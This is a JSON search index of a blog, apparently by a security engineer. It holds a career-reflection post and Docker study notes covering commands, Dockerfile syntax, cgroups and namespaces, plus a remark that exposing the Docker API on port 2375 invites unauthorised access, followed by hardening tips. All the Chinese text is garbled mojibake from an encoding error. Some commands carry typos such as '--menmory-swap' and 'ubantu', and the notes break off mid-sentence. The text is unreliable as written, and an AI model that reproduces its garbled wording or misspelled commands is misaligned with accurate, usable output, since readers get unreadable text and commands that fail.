[{"title":"é‡æ–°å‡ºå‘","url":"/2025/08/17/%E9%87%8D%E6%96%B0%E5%87%BA%E5%8F%91/","content":"é‡æ–°å‡ºå‘\nä»Š-2025å¹´8æœˆï¼Œä¸€æšæœ«æµ211æœ¬ç§‘æ¯•ä¸šï¼Œä»äº‹ç½‘ç»œå®‰å…¨ç›¸å…³å·¥ä½œ5å¹´çš„å·¥ç¨‹å¸ˆï¼ˆç‰›é©¬ï¼‰ï¼Œéšç€å¹´é¾„ã€è§è¯†çš„å¢é•¿ï¼Œæ„Ÿè§‰å‰è·¯æœ‰äº›è®¸è¿·é›¾ï¼Œé‡æ–°æ­å»ºä¸€ä¸ªåšå®¢ï¼ˆé¿å…ç†Ÿäººå‘ç°ï¼‰ï¼Œæ¢³ç†æ¥è·¯æ€è€ƒæœªæ¥æ–¹å‘ï¼Œè·³å‡ºå›´åŸï¼Œä¸åº”è¯¥ç¼ºå°‘é‡æ–°å‡ºå‘çš„å‹‡æ°”ã€‚\næ¥æ—¶è·¯\n2020å¹´ä¿¡æ¯å®‰å…¨ä¸“ä¸šæ¯•ä¸šï¼Œæ°å¥½é‡ä¸Šäº†å£ç½©ï¼Œæ¯•ä¸šå…¸ç¤¼éƒ½æ²¡æœ‰(ã„’oã„’)ã€‚å¤§å­¦ä¹Ÿç¡®å®æ²¡å­¦åˆ°ä»€ä¹ˆæœ¬äº‹ï¼Œå®¶é‡Œæ²¡æœ‰äººèƒ½ç»™ä»€ä¹ˆå»ºè®®ï¼Œæƒ³å°±ä¸šæ²¡æœ‰æ‰¾å®ä¹ ï¼Œè€ƒç ”ä¹Ÿæ²¡æœ‰æƒ³æ³•ï¼Œå¤§å­¦æ—¶æ‡’æƒ°ï¼Œä½†æ˜¯å¥½åœ¨å­¦ä¹ æˆç»©è¿˜å¯ä»¥ï¼Œé ç€æ¯•ä¸šè®¾è®¡çš„çŸ¥è¯†ï¼Œå‹‰å¼ºå…¥èŒäº†å®¶å°å…¬å¸åšå®‰å…¨æœåŠ¡ã€‚\nåˆåˆ›å…¬å¸å°±å‡ ä¸ªäººï¼Œåšçš„ä¸œè¥¿å¾ˆå¤šå¾ˆæ‚ï¼Œç°åœ¨å›æƒ³ä¹Ÿå¾ˆæ„Ÿè°¢å½“åˆçš„è€æ¿è®©æˆ‘å­¦ä¼šäº†å¾ˆå¤šã€‚æŠ€æœ¯å­¦ä¼šäº†æ¸—é€ã€åº”æ€¥ã€javaä»£ç å®¡è®¡ï¼Œåæ¥è¿˜ç»™å…¬å¸çš„ç ”å‘æ­å»ºäº†å®Œæ•´çš„SDLCï¼Œå°å…¬å¸çš„å·¥ä½œå†…å®¹åŒ…æ‹¬(å¤§ç‰›é©¬)ï¼šå”®å‰æ”¯æŒï¼Œå”®åæ‰§è¡Œï¼Œé¡¹ç›®ç»ç†ã€‚\n\nå”®å‰æ”¯æŒï¼šååŠ©é”€å”®å¯¹æ¥å®¢æˆ·ï¼Œå‚ä¸éœ€æ±‚æ²Ÿé€šä¸æ–¹æ¡ˆè®²è§£ï¼Œç»“åˆå®¢æˆ·ä¸šåŠ¡åœºæ™¯æä¾›é’ˆå¯¹æ€§å®‰å…¨æµ‹è¯•å»ºè®®ï¼Œæ”¯æ’‘é”€å”®ç­¾å•ï¼›\nå”®åæ‰§è¡Œï¼šé”€å”®ç­¾å•åï¼Œä½œä¸ºæ ¸å¿ƒæ¥å£äººå¯¹æ¥å®¢æˆ·ï¼Œæ˜ç¡®æµ‹è¯•èŒƒå›´ã€è·å–ç³»ç»Ÿæƒé™ã€æ¢³ç†ä¸šåŠ¡æµç¨‹ç­‰å…³é”®æµ‹è¯•ä¿¡æ¯ï¼Œç¡®ä¿æµ‹è¯•æ–¹å‘ä¸å®¢æˆ·éœ€æ±‚ä¸€è‡´ï¼›\né¡¹ç›®ç»ç†ï¼šä»é¡¹ç›®å¯åŠ¨åˆ°æœ€ç»ˆäº¤ä»˜ï¼Œå…¨ç¨‹è´Ÿè´£è¿›åº¦æŠŠæ§ã€é—®é¢˜åè°ƒä¸ç»“æœéªŒæ”¶ï¼Œä¿éšœå®¢æˆ·æ»¡æ„åº¦ã€‚\n\næ˜¯çš„å¹²çš„å¾ˆå¤šï¼Œå¾ˆæ‚ï¼Œå¾ˆç´¯ï¼Œå·¥èµ„è¿˜ä½ï¼ˆæ¯”996ç‹ ï¼‰~~ï¼Œå…¬å¸ä»å¼€å§‹çš„6äººåˆ°åæ¥çš„70äººã€‚\n2022å¹´7æœˆã€‚å¤šç§åŸå› è£¸è¾äº†ï¼Œ7æœˆä¸­æ—¬å¼€å§‹æŠ•ç®€å†ä¸€ç›´æ²¡æœ‰åˆé€‚çš„æœºä¼šï¼Œæ°å¥½HWè¦å¼€å§‹äº†ï¼Œæ‰¾æœ‹å‹è¦äº†ä¸ªæœºä¼šï¼Œå»äº†æŸä¸ªä¾›ç”µæ‰€å€¼ç­ï¼ˆé—²-ä¼‘æ¯ï¼‰ã€‚è¡Œæƒ…å¥½ä¸€å¤©ç¨å3.5Kï¼Œå¾ˆå¼€å¿ƒã€‚HWä¹‹åæ‰€åœ¨åœ°ï¼ˆä¿å¯†ï¼‰çš„å·¥ä½œæœºä¼šç¡®å®å¤ªå°‘ï¼Œç¾¤é‡Œçœ‹åˆ°æœ‰åŒ—äº¬çš„æœºä¼šï¼Œä¸€æŠ•å°±ä¸Šå²¸äº†ï¼Œæ˜¯ä¸€å®¶å¤®ä¼çš„å­å…¬å¸ã€‚\n2022å¹´10æœˆã€‚ç¬¬ä¸€æ¬¡æ¥åŒ—äº¬ï¼Œè®°å¾—å¤©æ°”å¾®å‡‰ï¼Œå—æ–¹çš„äººä¸å¤ªé€‚åº”åŒ—äº¬çš„å¹²ï¼Œä¹°äº†åŠ æ¹¿å™¨ï¼Œå»äº†æ•…å®«ï¼Œå¤©å®‰é—¨ï¼Œé¢å’Œå›­ï¼Œç„¶åå±…å®¶äº†ã€‚ã€‚å…¥èŒæ˜¯æ­£å¸¸çš„ï¼Œ8å·å°±å…¥èŒäº†ï¼Œå¤®ä¼çš„ç¦åˆ©è¿˜æ˜¯ä¸é”™äº†ï¼ŒåŠ ç­ä¹Ÿä¸å¤šï¼Œä¸€ä¸‹å­éå¸¸ä¸ä¹ æƒ¯ï¼ˆğŸ‚å½“å¤šäº†ï¼‰ã€‚å·¥ä½œå†…å®¹ä¹Ÿå˜å¾—å‚ç›´ï¼šæ¸—é€æµ‹è¯•ã€åº”æ€¥å“åº”ã€‚ä¹Ÿç†Ÿæ‚‰äº†ä¸€äº›æ¼æ´ç®¡ç†ã€å®‰å…¨åŠ å›ºã€åˆè§„ç›¸å…³çš„å·¥ä½œï¼Œä»ä¹™æ–¹å®‰å…¨æœåŠ¡è½¬å‘äº†ç”²æ–¹å®‰å…¨å»ºè®¾ã€‚\n2025å¹´8æœˆã€‚åœ¨è¿™å®¶å…¬å¸å·¥ä½œäº†ä¸‰å¹´ï¼Œè€ƒäº†PTSï¼Œåç»­åº”è¯¥ä¼šè€ƒCISSPã€‚å·¥ä½œçš„å†…å®¹å·²ç»å˜å¾—ç¨‹åºåŒ–ï¼Œæœºæ¢°åŒ–ï¼Œæ„Ÿè§‰è‡ªå·±çš„å¯æ›¿ä»£æ€§å¤ªå¼ºäº†ã€‚å…¬å¸æµç¨‹è§„å®šçš„å‡èŒæ¶¨è–ªéƒ½æ²¡æœ‰è½å®ï¼Œå’Œæœ‹å‹ä»¬èŠå¤©æˆ‘ç°åœ¨çš„å¹´è–ªæ˜¯ä»–ä»¬çš„1/3ï¼Œå·®è·è¿˜æ˜¯æŒºå¤§çš„ï¼Œè€Œä¸”å…¬å¸æ˜¯å¸‚åœºåŒ–ç»è¥ä¹Ÿä¸æ˜¯é‚£ä¹ˆç¨³ï¼Œæœ‰10%çš„æ·˜æ±°ç‡ï¼Œæ€è€ƒèµ°äººäº†ï¼Œæ¯•ç«Ÿè¿œç¦»å®¶ä¹¡å°±æ˜¯èµšé’±æ¥çš„ã€‚\nç†æ€ç»ª\nç›®å‰æˆ‘çš„æŠ€èƒ½æœ‰æ”»é˜²ï¼Œåº”æ€¥ï¼Œä»£ç å®¡è®¡ï¼ˆåˆšæ‹¿èµ·æ¥ï¼Œå†™å‰å·²ç»å®¡è®¡äº†ä¸¤ä¸ªCMSçš„æ´äº†ï¼‰ã€‚ä¹‹å‰çœ‹åˆ°è¿‡è¿™ä¹ˆä¸€å¥è¯ï¼Œäººçš„ç²¾åŠ›æœ‰é™ï¼Œé€‰æ‹©ä¸€ä¸ªæƒ³åšçš„æ–¹å‘å»åšåˆ°ä¸å¯æ›¿ä»£ï¼Œæ”»é˜²æˆ‘æ„Ÿè§‰å…¥è¡Œç®€å•å¯æ›¿ä»£æ€§å¼ºï¼Œç»“åˆå…¥è¡Œå°±ä¸€ç›´æœ‰çš„ç†æƒ³ï¼Œå¯ä»¥è‡ªå·±è¿è¥ä¸€å®¶å…¬å¸æˆ–è€…ä¸€ä¸ªäº§å“çº¿çš„å®‰å…¨ï¼Œå°±æ˜¯æƒ³åšå®‰å…¨æ¶æ„å¸ˆï¼Œçœ‹äº†çœ‹æœ€æ–°çš„å‘å±•ï¼ˆæ‹›è˜ï¼‰ï¼Œäº‘è®¡ç®—å’ŒAIæ˜¯ç›®å‰æœ€ç«çš„æ–¹å‘ã€‚å®‰å…¨ä¸€ç›´éƒ½æ˜¯é”¦ä¸Šæ·»èŠ±çš„ï¼ŒAIè¿˜æ²¡æœ‰é‚£ä¹ˆæˆç†Ÿï¼Œäº‘ç›®å‰ç›¸å¯¹æˆç†Ÿã€‚åç»­æ‰“ç®—ç ”ç©¶äº‘ç›¸å…³çš„å®‰å…¨+ä»£ç å®¡è®¡+åº”æ€¥å“åº”ï¼ŒåŠ å¼ºè‡ªå·±çš„ä¸å¯æ›¿ä»£æ€§ã€‚çœ‹åˆ°å¾ˆå¤šSDLåœ¨æ‹›è˜ï¼Œå’Œæˆ‘æƒ³åšï¼Œèƒ½åŠ›å›¾è°±éƒ½å’Œæˆ‘çš„æŠ€èƒ½éå¸¸ç›¸è¿‘ï¼Œå†œå†25å¹´åº•å‡†å¤‡å‡ºå‡»è¿™ä¸ªå²—ä½ï¼Œå¸Œæœ›å¯ä»¥æˆåŠŸã€‚\nè°ˆè§„åˆ’\nå†™è¿™ç¯‡æ€»ç»“ï¼Œå¯¹äºSDLåªæœ‰åˆæ­¥çš„æ¦‚å¿µï¼Œè®¤çŸ¥è¿˜æ˜¯æœ‰é™ï¼Œåªèƒ½å…ˆåšå†è°ƒæ•´ã€‚\n\n\näº‘å¸¸ç”¨ç»„ä»¶æ¼æ´åŸç†ã€å¤ç°ã€ä¿®å¤çŸ¥è¯†å­¦ä¹ ã€‚\n\nDockerã€K8sã€GitLabã€Jenkinsã€Prometheus+Grafanaã€ELK\n\n\n\nä»£ç å®¡è®¡èƒ½åŠ›æŒç»­å¼ºåŒ–\n\nJavaåˆ©ç”¨é“¾çš„å­¦ä¹ å’ŒæŒ–æ˜\nCodeQLä½¿ç”¨ï¼Œå†™å‡ºé€šç”¨æ¼æ´çš„è§„åˆ™\n\n\n\næ­å»º DevSecOps ç¯å¢ƒ\n\næ­å»ºç¯å¢ƒ\nOWASP Threat Dragonã€SonarQubeã€OWASP Dependency-Checkã€Checkovã€Clairå­¦ä¹ \n\n\n\nâ€\nâ€\n","categories":["é˜¶æ®µæ€»ç»“"]},{"title":"DockeråŸºæœ¬çŸ¥è¯†æ€»ç»“","url":"/2025/08/20/Docker%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/","content":"æœ¬æ–‡æ˜¯å­¦ä¹ ã€Šæ¯å¤©äº”åˆ†é’Ÿç©è½¬Dockerå®¹å™¨æŠ€æœ¯ã€‹çš„æ€»ç»“ã€‚æ˜¯åŸºç¡€çŸ¥è¯†å­¦ä¹ ï¼Œç†Ÿæ‚‰dockerå®¹å™¨æŠ€æœ¯ï¼Œä¸ºäº†æ›´å¥½çš„ç ”ç©¶dockerç›¸å…³æ¼æ´ã€‚\nå®¹å™¨çŸ¥è¯†å›¾è°±\nâ€‹\nâ€\nå®¹å™¨çš„åŸºæœ¬æ¶æ„\n\nDockerå®¢æˆ·ç«¯ï¼šClientâ€‹\nDockeræœåŠ¡å™¨ï¼šDocker daemonâ€‹\nDockeré•œåƒï¼šImageâ€‹\nDockerä»“åº“ï¼šRegistryâ€‹\nDockerå®¹å™¨ï¼šContainerâ€‹\n\nâ€‹\né€šè¿‡dockeræˆ‘ä»¬å¯ä»¥æ–¹ä¾¿åœ°åœ¨Hostä¸Šæ„å»ºå’Œè¿è¡Œå®¹å™¨ã€‚æœ€å¸¸ç”¨çš„Dockerå®¢æˆ·ç«¯æ˜¯dockerå‘½ä»¤ã€‚ç”¨æˆ·ä¹Ÿå¯ä»¥é€šè¿‡REST APIä¸æœåŠ¡å™¨é€šä¿¡ã€‚\nå¸¸ç”¨çš„å‘½ä»¤\n\n\n\nå‘½ä»¤åˆ†ç±»\nå‘½ä»¤\nåŠŸèƒ½è¯´æ˜\nå¸¸ç”¨ç¤ºä¾‹\n\n\n\n\nå®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†\nâ€‹docker runâ€‹â€‹\nåˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨\nâ€‹docker run -d -p 80:80 --name mynginx nginxï¼ˆåå°å¯åŠ¨ nginxï¼Œæ˜ å°„ 80 ç«¯å£ï¼‰\n\n\n\nâ€‹docker start [å®¹å™¨å/ID]â€‹\nå¯åŠ¨å·²åœæ­¢çš„å®¹å™¨\nâ€‹docker start mynginxâ€‹\n\n\n\nâ€‹docker stop [å®¹å™¨å/ID]â€‹\nåœæ­¢è¿è¡Œä¸­çš„å®¹å™¨ï¼ˆä¼˜é›…å…³é—­ï¼‰\nâ€‹docker stop mynginxâ€‹\n\n\n\nâ€‹docker restart [å®¹å™¨å/ID]â€‹\né‡å¯å®¹å™¨\nâ€‹docker restart mynginxâ€‹\n\n\n\nâ€‹docker rm [å®¹å™¨å/ID]â€‹\nåˆ é™¤å®¹å™¨ï¼ˆéœ€å…ˆåœæ­¢ï¼Œ-f å¼ºåˆ¶åˆ é™¤è¿è¡Œä¸­å®¹å™¨ï¼‰\nâ€‹docker rm -f mynginxâ€‹\n\n\nå®¹å™¨æŸ¥çœ‹\nâ€‹docker psâ€‹\næŸ¥çœ‹è¿è¡Œä¸­çš„å®¹å™¨\nâ€‹docker ps -aï¼ˆæŸ¥çœ‹æ‰€æœ‰å®¹å™¨ï¼ŒåŒ…æ‹¬å·²åœæ­¢ï¼‰\n\n\n\nâ€‹docker inspect [å®¹å™¨å/ID]â€‹â€‹\næŸ¥çœ‹å®¹å™¨è¯¦ç»†ä¿¡æ¯ï¼ˆé…ç½®ã€ç½‘ç»œç­‰ï¼‰\nâ€‹docker inspect mynginxâ€‹\n\n\n\nâ€‹docker logs [å®¹å™¨å/ID]â€‹â€‹\næŸ¥çœ‹å®¹å™¨æ—¥å¿—ï¼ˆ-f å®æ—¶è·Ÿè¸ªï¼Œâ€“tail 100 æŸ¥çœ‹æœ€å 100 è¡Œï¼‰\nâ€‹docker logs -f mynginxâ€‹\n\n\nå®¹å™¨æ“ä½œ\nâ€‹docker exec -it [å®¹å™¨å/ID] [å‘½ä»¤]â€‹â€‹\nè¿›å…¥è¿è¡Œä¸­çš„å®¹å™¨å¹¶æ‰§è¡Œå‘½ä»¤ï¼ˆ-it äº¤äº’æ¨¡å¼ï¼‰\nâ€‹docker exec -it mynginx /bin/bashï¼ˆè¿›å…¥ bash ç»ˆç«¯ï¼‰\n\n\n\nâ€‹docker cp [æœ¬åœ°è·¯å¾„] [å®¹å™¨å/ID]:[å®¹å™¨è·¯å¾„]â€‹\nä»æœ¬åœ°å¤åˆ¶æ–‡ä»¶åˆ°å®¹å™¨\nâ€‹docker cp ./test.txt mynginx:/tmp/â€‹\n\n\n\nâ€‹docker cp [å®¹å™¨å/ID]:[å®¹å™¨è·¯å¾„] [æœ¬åœ°è·¯å¾„]â€‹\nä»å®¹å™¨å¤åˆ¶æ–‡ä»¶åˆ°æœ¬åœ°\nâ€‹docker cp mynginx:/tmp/test.txt ./â€‹\n\n\n\nâ€‹docker top [å®¹å™¨å/ID]â€‹â€‹\næŸ¥çœ‹å®¹å™¨å†…è¿è¡Œçš„è¿›ç¨‹\nâ€‹docker top mynginxâ€‹\n\n\né•œåƒç®¡ç†\nâ€‹docker imagesâ€‹\næŸ¥çœ‹æœ¬åœ°é•œåƒ\nâ€‹docker images -aï¼ˆåŒ…æ‹¬ä¸­é—´é•œåƒï¼‰\n\n\n\nâ€‹docker pull [é•œåƒå:æ ‡ç­¾]â€‹\nä»ä»“åº“æ‹‰å–é•œåƒ\nâ€‹docker pull mysql:8.0â€‹\n\n\n\nâ€‹docker push [é•œåƒå:æ ‡ç­¾]â€‹\næ¨é€é•œåƒåˆ°ä»“åº“ï¼ˆéœ€å…ˆç™»å½•ï¼‰\nâ€‹docker push myrepo/myimage:v1â€‹\n\n\n\nâ€‹docker rmi [é•œåƒå/ID]â€‹\nåˆ é™¤æœ¬åœ°é•œåƒï¼ˆ-f å¼ºåˆ¶åˆ é™¤ï¼Œéœ€å…ˆåˆ é™¤ä¾èµ–å®¹å™¨ï¼‰\nâ€‹docker rmi -f nginxâ€‹\n\n\n\nâ€‹docker build -t [é•œåƒå:æ ‡ç­¾] [Dockerfileè·¯å¾„]â€‹\nåŸºäº Dockerfile æ„å»ºé•œåƒ\nâ€‹docker build -t myapp:v1 .ï¼ˆå½“å‰ç›®å½•çš„ Dockerfileï¼‰\n\n\né•œåƒä¿¡æ¯\nâ€‹docker image inspect [é•œåƒå/ID]â€‹â€‹\næŸ¥çœ‹é•œåƒè¯¦ç»†ä¿¡æ¯\nâ€‹docker image inspect nginxâ€‹\n\n\n\ndocker history [é•œåƒå/ID]â€‹â€‹\næŸ¥çœ‹é•œåƒæ„å»ºå†å²ï¼ˆå„å±‚æ“ä½œï¼‰\nâ€‹docker history nginxâ€‹\n\n\nä»“åº“ç®¡ç†\nâ€‹docker login [ä»“åº“åœ°å€]â€‹\nç™»å½• Docker ä»“åº“ï¼ˆé»˜è®¤ Docker Hubï¼‰\nâ€‹docker loginï¼ˆç™»å½• Docker Hubï¼‰\n\n\n\nâ€‹docker logout [ä»“åº“åœ°å€]â€‹\né€€å‡ºä»“åº“ç™»å½•\nâ€‹docker logoutâ€‹\n\n\n\nâ€‹docker search [å…³é”®è¯]â€‹\næœç´¢ä»“åº“ä¸­çš„é•œåƒ\nâ€‹docker search pythonâ€‹\n\n\næ•°æ®å·ç®¡ç†\nâ€‹docker volume create [å·å]â€‹\nåˆ›å»ºæ•°æ®å·ï¼ˆæŒä¹…åŒ–å­˜å‚¨ï¼‰\nâ€‹docker volume create myvolâ€‹\n\n\n\nâ€‹docker volume lsâ€‹\næŸ¥çœ‹æ‰€æœ‰æ•°æ®å·\nâ€‹docker volume lsâ€‹\n\n\n\nâ€‹docker volume inspect [å·å]â€‹\næŸ¥çœ‹æ•°æ®å·è¯¦ç»†ä¿¡æ¯\nâ€‹docker inspect myvolâ€‹\n\n\n\nâ€‹docker volume rm [å·å]â€‹\nåˆ é™¤æ•°æ®å·\nâ€‹docker volume rm myvolâ€‹\n\n\nç½‘ç»œç®¡ç†\nâ€‹docker network lsâ€‹\næŸ¥çœ‹ Docker ç½‘ç»œ\nâ€‹docker network lsâ€‹\n\n\n\nâ€‹docker network create [ç½‘ç»œå]â€‹\nåˆ›å»ºè‡ªå®šä¹‰ç½‘ç»œï¼ˆé»˜è®¤ bridge æ¨¡å¼ï¼‰\nâ€‹docker network create mynetâ€‹\n\n\n\nâ€‹docker network connect [ç½‘ç»œå] [å®¹å™¨å/ID]â€‹\nå°†å®¹å™¨è¿æ¥åˆ°æŒ‡å®šç½‘ç»œ\nâ€‹docker network connect mynet mynginxâ€‹\n\n\n\nâ€‹docker network disconnect [ç½‘ç»œå] [å®¹å™¨å/ID]â€‹\næ–­å¼€å®¹å™¨ä¸ç½‘ç»œçš„è¿æ¥\nâ€‹docker network disconnect mynet mynginxâ€‹\n\n\nç³»ç»Ÿä¿¡æ¯\nâ€‹docker infoâ€‹\næŸ¥çœ‹ Docker ç³»ç»Ÿä¿¡æ¯ï¼ˆç‰ˆæœ¬ã€é•œåƒæ•°ã€å®¹å™¨æ•°ç­‰ï¼‰\nâ€‹docker infoâ€‹\n\n\n\nâ€‹docker versionâ€‹\næŸ¥çœ‹ Docker å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ç‰ˆæœ¬\nâ€‹docker versionâ€‹\n\n\n\nâ€‹\nREST API éœ€è¦Docker daemoné…ç½®å¼€å¯ç«¯å£ï¼Œå¾ˆå¤šæœªæˆæƒæ¼æ´å°±æ˜¯è¿™ä¸ªåŸå› ï¼š\n#Linux ç³»ç»Ÿ ç¼–è¾‘ /etc/docker/daemon.json&#123;  &quot;hosts&quot;: [&quot;unix:///var/run/docker.sock&quot;, &quot;tcp://0.0.0.0:2375&quot;]&#125;Windows/macOSï¼šé€šè¿‡ Docker Desktop é…ç½®ï¼šè¿›å…¥ Settings â†’ Docker Engineï¼Œåœ¨ JSON é…ç½®ä¸­æ·»åŠ ä¸Šè¿° hosts å­—æ®µï¼Œç‚¹å‡» Apply &amp; Restartã€‚å®¢æˆ·ç«¯è¿æ¥ï¼šdocker -H 192.168.56.102 info\n//å®‰å…¨é…ç½®1ã€TLS è¯ä¹¦è®¤è¯,å®¢æˆ·ç«¯ä½¿ç”¨è¯ä¹¦è®¤è¯è®¿é—®APIï¼ˆç½‘ä¸Šéšä¾¿éƒ½æœ‰æ•™ç¨‹ä¸å†™äº†ï¼‰2ã€æœ€å°æƒé™åŸåˆ™ï¼šä»…å¼€æ”¾å¿…è¦çš„ API ç«¯å£ï¼ˆ2376ï¼‰ï¼Œå¹¶é™åˆ¶æ¥æº IPï¼ˆé€šè¿‡é˜²ç«å¢™ï¼‰ã€‚3ã€å®šæœŸè½®æ¢è¯ä¹¦ï¼šTLS è¯ä¹¦è®¾ç½®è¾ƒçŸ­æœ‰æ•ˆæœŸï¼ˆå¦‚ 90 å¤©ï¼‰ï¼Œå®šæœŸæ›´æ–°ã€‚4ã€æ—¥å¿—å®¡è®¡ï¼šå¼€å¯ Docker å’Œåå‘ä»£ç†ï¼ˆå¦‚æœæœ‰ï¼‰çš„è®¿é—®æ—¥å¿—ï¼Œç›‘æ§å¼‚å¸¸è¯·æ±‚ã€‚5ã€ä½¿ç”¨ç½‘ç»œéš”ç¦»ï¼šå°† Docker API éƒ¨ç½²åœ¨ç§æœ‰ç½‘ç»œï¼Œé¿å…ç›´æ¥æš´éœ²å…¬ç½‘ã€‚\nDockeré•œåƒ\nDockerfileæ˜¯é•œåƒçš„æè¿°æ–‡ä»¶ï¼Œå®šä¹‰äº†å¦‚ä½•æ„å»ºDockeré•œåƒã€‚\nFROM debianRUN apt-get install emacsRUN apt-get install apache2CMD [&quot;/bin/bash&quot;]\næ–°é•œåƒæ˜¯ä»baseé•œåƒ(å†…æ ¸å’Œhostä¸€æ ·)ä¸€å±‚ä¸€å±‚å åŠ ç”Ÿæˆçš„ã€‚æ¯å®‰è£…ä¸€ä¸ªè½¯ä»¶ï¼Œå°±åœ¨ç°æœ‰é•œåƒçš„åŸºç¡€ä¸Šå¢åŠ ä¸€å±‚ã€‚åˆ†å±‚ç»“æ„æœ€å¤§çš„ä¸€ä¸ªå¥½å¤„å°±æ˜¯ï¼šå…±äº«èµ„æº\nâ€‹\n#æ„å»ºé•œåƒdocker build -t [é•œåƒå:æ ‡ç­¾] [Dockerfileè·¯å¾„]docker commit [é€‰é¡¹] &lt;å®¹å™¨IDæˆ–åç§°&gt; &lt;æ–°é•œåƒå[:æ ‡ç­¾]&gt;  //ç°æœ‰å®¹å™¨æ‰“åŒ…æˆé•œåƒ#dockerfileè¯­æ³•FROM  \t\t#æŒ‡å®šbaseé•œåƒã€‚MAINTAINER  #è®¾ç½®é•œåƒçš„ä½œè€…ï¼Œå¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ã€‚COPY  \t\t#å°†æ–‡ä»¶ä»build contextå¤åˆ¶åˆ°é•œåƒã€‚COPY src destADD \t\t#ä¸COPYç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯ï¼Œå¦‚æœsrcæ˜¯å½’æ¡£æ–‡ä»¶ï¼ˆtarã€zipã€tgzã€xzç­‰ï¼‰æ–‡ä»¶ä¼šè¢«è‡ªåŠ¨è§£å‹åˆ°destã€‚ENV \t\t#è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œç¯å¢ƒå˜é‡å¯è¢«åé¢çš„æŒ‡ä»¤ä½¿ç”¨ã€‚EXPOSE \t\t#æŒ‡å®šå®¹å™¨ä¸­çš„è¿›ç¨‹ä¼šç›‘å¬æŸä¸ªç«¯å£ï¼ŒDockerå¯ä»¥å°†è¯¥ç«¯å£æš´éœ²å‡ºæ¥ã€‚VOLUME \t\t#å°†æ–‡ä»¶æˆ–ç›®å½•å£°æ˜ä¸ºvolumeã€‚WORKDIR \t#ä¸ºåé¢çš„RUNã€CMDã€ENTRYPOINTã€ADDæˆ–COPYæŒ‡ä»¤è®¾ç½®é•œåƒä¸­çš„å½“å‰å·¥ä½œç›®å½•ã€‚RUN \t\t#åœ¨å®¹å™¨ä¸­è¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚CMD \t\t#å®¹å™¨å¯åŠ¨æ—¶è¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚Dockerfileä¸­å¯ä»¥æœ‰å¤šä¸ªCMDæŒ‡ä»¤ï¼Œä½†åªæœ‰æœ€åä¸€ä¸ªç”Ÿæ•ˆã€‚CMDå¯ä»¥è¢«dockerrunä¹‹åçš„å‚æ•°æ›¿æ¢ã€‚ENTRYPOINT \t#è®¾ç½®å®¹å™¨å¯åŠ¨æ—¶è¿è¡Œçš„å‘½ä»¤ã€‚Dockerfileä¸­å¯ä»¥æœ‰å¤šä¸ªENTRYPOINTæŒ‡ä»¤ï¼Œä½†åªæœ‰æœ€åä¸€ä¸ªç”Ÿæ•ˆã€‚CMDæˆ–docker runä¹‹åçš„å‚æ•°ä¼šè¢«å½“ä½œå‚æ•°ä¼ é€’ç»™ENTRYPOINTã€‚\nDockerå®¹å™¨\né•œåƒå¯åŠ¨çš„å®ä¾‹ã€‚\nèµ„æºé™åˆ¶\n#å†…å­˜é™é¢ -m æˆ– --memorydocker run -m 200M --menmory-swap=300M ubantu#CPUé™é¢ -c æˆ– --cpu-sharesdocker run --name A -c 1024 ubantu #Block IOå¸¦å®½é™é¢ é™åˆ¶å®¹å™¨å†™ /dev/sdaçš„é€Ÿç‡ä¸º30 MB/sdocker run -it --device-write-bps /dev/sda:30MB ubantu--device-read-bpsï¼šé™åˆ¶è¯»æŸä¸ªè®¾å¤‡çš„bpsã€‚--device-write-bpsï¼šé™åˆ¶å†™æŸä¸ªè®¾å¤‡çš„bpsã€‚--device-read-iopsï¼šé™åˆ¶è¯»æŸä¸ªè®¾å¤‡çš„iopsã€‚--device-write-iopsï¼šé™åˆ¶å†™æŸä¸ªè®¾å¤‡çš„iopsã€‚bpsæ˜¯byte per secondï¼Œæ¯ç§’è¯»å†™çš„æ•°æ®é‡ã€‚iopsæ˜¯io per secondï¼Œæ¯ç§’IOçš„æ¬¡æ•°ã€‚\nå®¹å™¨çš„åº•å±‚æŠ€æœ¯\ncgroupå®ç°èµ„æºé™é¢ï¼Œnamespaceå®ç°èµ„æºéš”ç¦»ã€‚\ncgroup\ncgroupå…¨ç§°Control Groupã€‚Linuxæ“ä½œç³»ç»Ÿé€šè¿‡cgroupå¯ä»¥è®¾ç½®è¿›ç¨‹ä½¿ç”¨CPUã€å†…å­˜å’ŒIOèµ„æºçš„é™é¢ã€‚ä¸Šé¢çš„ --cpu-sharesã€-mã€â€“device-write-bps å®é™…ä¸Šå°±æ˜¯åœ¨é…ç½®cgroupã€‚å¯ä»¥åœ¨å®¿ä¸»æœºæˆ–è€…å®¹å™¨å†…  /sys/fs/cgroupä¸­æ‰¾åˆ°å®ƒã€‚æœ‰ä¸€ä¸ªæ¼æ´CVE-2022-0492ï¼ˆcgroupé€ƒé€¸ï¼‰ï¼Œ è¿™é‡Œä¸å±•å¼€å†™ã€‚\n\nnamespace\nåœ¨æ¯ä¸ªå®¹å™¨ä¸­ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥çœ‹åˆ°æ–‡ä»¶ç³»ç»Ÿã€ç½‘å¡ç­‰èµ„æºï¼Œè¿™äº›èµ„æºçœ‹ä¸Šå»æ˜¯å®¹å™¨è‡ªå·±çš„ã€‚æ‹¿ç½‘å¡æ¥è¯´ï¼Œæ¯ä¸ªå®¹å™¨éƒ½ä¼šè®¤ä¸ºè‡ªå·±æœ‰ä¸€å—ç‹¬ç«‹çš„ç½‘å¡ï¼Œå³ä½¿hostä¸Šåªæœ‰ä¸€å—ç‰©ç†ç½‘å¡ã€‚Linuxå®ç°è¿™ç§æ–¹å¼çš„æŠ€æœ¯æ˜¯namespaceã€‚namespaceç®¡ç†ç€hostä¸­å…¨å±€å”¯ä¸€çš„èµ„æºï¼Œå¹¶å¯ä»¥è®©æ¯ä¸ªå®¹å™¨éƒ½è§‰å¾—åªæœ‰è‡ªå·±åœ¨ä½¿ç”¨å®ƒã€‚æ¢å¥è¯è¯´ï¼Œnamespaceå®ç°äº†å®¹å™¨é—´èµ„æºçš„éš”ç¦»ã€‚\nLinuxä½¿ç”¨äº†6ç§namespaceï¼Œåˆ†åˆ«å¯¹åº”6ç§èµ„æºï¼šMountã€UTSã€